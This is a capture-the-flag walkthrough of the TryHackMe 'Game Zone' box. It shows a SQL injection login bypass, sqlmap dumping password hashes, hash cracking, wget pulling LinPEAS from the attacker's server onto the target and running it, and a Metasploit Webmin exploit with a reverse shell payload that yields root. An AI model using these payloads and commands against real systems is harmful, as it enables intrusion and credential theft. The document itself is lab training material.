@@ -1,0 +1,161 @@
+Game Zone – THM
+
+Overview
+
+Game Zone is a TryHackMe box that requires the use of SQL injection, password cracking, reverse SSH tunneling, and Metasploit.
+
+User Flag
+
+First, start off with an aggressive scan against the most common ports using Nmap.
+
+
+As we can see, there are two open ports:
+
+Port 22 – SSH 7.2p2
+Port 80 – Apache httpd 2.4.18
+
+Since there is an HTTP service running, the first thing to do is start directory discovery via gobuster.
+
+└─$ gobuster dir --url http://10.10.238.97 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.238.97
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/08/29 18:00:33 Starting gobuster in directory enumeration mode
+===============================================================
+After launching the scan, perform some manual web application enumeration. We discover and capture a login form off /index.
+
+POST /index.php HTTP/1.1
+Host: 10.10.238.97
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Origin: http://10.10.238.97
+Connection: close
+Referer: http://10.10.238.97/
+Cookie: PHPSESSID=h4had2deibkvklgbt6ti1fhap1
+Upgrade-Insecure-Requests: 1
+
+username=Admin&password=Pass&x=27&y=3
+
+If we send this to Burpsuite and use the Intruder module with an SQL wordlist, we can discover the username field is vulnerable to an SQL injection attack.
+
+Log in: admin' OR 1=1 -- -
+Password: pass
+This takes us to a /portal.php.
+
+
+
+Using Burp Suite to intercept the web request again, save the contents to a file and use SQLMap to find another injection vector.
+
+POST /portal.php HTTP/1.1
+
+Host: 10.10.240.149
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://10.10.240.149
+Connection: close
+Referer: http://10.10.240.149/portal.php
+Cookie: PHPSESSID=a1jugj0lqpq43du1e5tvrjlf85
+Upgrade-Insecure-Requests: 1
+
+searchitem=VULNERABLE
+└─$ sqlmap -r web_req 10.10.240.149 --dbms=mysql --dump
+This command results in dumping a hash from a password table. From here, I throw it into a service like CyberChef or hashID to figure out what hashing algorithm was used.
+
+Once we have the hash identified, we can use JohnTheRipper to get some credentials.
+
+john crackme --wordlist=/usr/share/wordlists/rockyou.txt --format=********
+Using the discovered username and password, we can log into SSH and grab the first flag.
+
+Root Flag
+
+After looking through some files and trying the most common privesc techniques, I use LinPEAS to speed up the process.
+
+First, set up a local python3 HTTP server on the attack box.
+
+└─$ python3 -m http.server 5555
+Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+Next, use wget to pull the file from the /tmp directory where the user has write permissions.
+
+user@gamezone:/tmp$ wget http://10.13.18.79:5555/linpeas
+--2021-08-29 23:13:24--  http://10.13.18.79:5555/linpeas
+Connecting to 10.13.18.79:5555... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 342868 (335K) [application/octet-stream]
+Saving to: ‘linpeas’
+
+linpeas                             100%[================================================================>] 334.83K   312KB/s    in 1.1s    
+
+2021-08-29 23:13:25 (312 KB/s) - ‘linpeas’ saved [342868/342868]
+
+user@gamezone:/tmp$ chmod +x linpeas 
+user@gamezone:/tmp$ ./linpeas
+Make sure to enable execute permissions on the file before running it.
+
+One of the interesting finds here is that there is a port on 10000 that is being run locally.
+
+
+To access this port with our web browser, we will need to establish a reverse SSH tunnel.
+
+└─$ ssh -L 10000:127.0.0.1:10000 user@10.10.240.149
+Now, if we enter 127.0.0.1:10000 into the browser, we are directed to a new web page.
+
+
+Web Portal
+Credential reuse is all too common, and by entering the same credentials we found for our SSH login, we are directed to a page with contains the version number of Webmin.
+
+
+Throwing this into searchsploit shows us a Ruby file, which usually indicated there might be a Metasploit module for this exploit.
+
+└─$ searchsploit 1.580             
+------------------------------------ ---------------------------------
+ Exploit Title                      |  Path
+------------------------------------ ---------------------------------
+Webmin X.XXX - '/file/show.cgi' Rem | unix/remote/21851.rb
+------------------------------------ ---------------------------------
+After launching msfconsole, we can use the search feature and confirm there is a module.
+
+exploit/unix/webapp/webmin_show_cgi_exec
+The last step is to configure the module and run the exploit.
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  xxxxxxxxxxxxxxx  yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     10000            yes       The target port (TCP)
+   SSL       false            yes       Use SSL
+   USERNAME  user             yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun1             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+Make sure to set SSL to false and the RHOST to localhost since that’s where our ssh tunnel is established. Lastly, the payload ‘cmd/unix/reverse’ worked best for me.
+
+This will give us a connection as root, where you can grab the flag under the /root directory.
+
+That’s it for this box!
+
+Thanks to TryHackMe for sponsoring some great content!
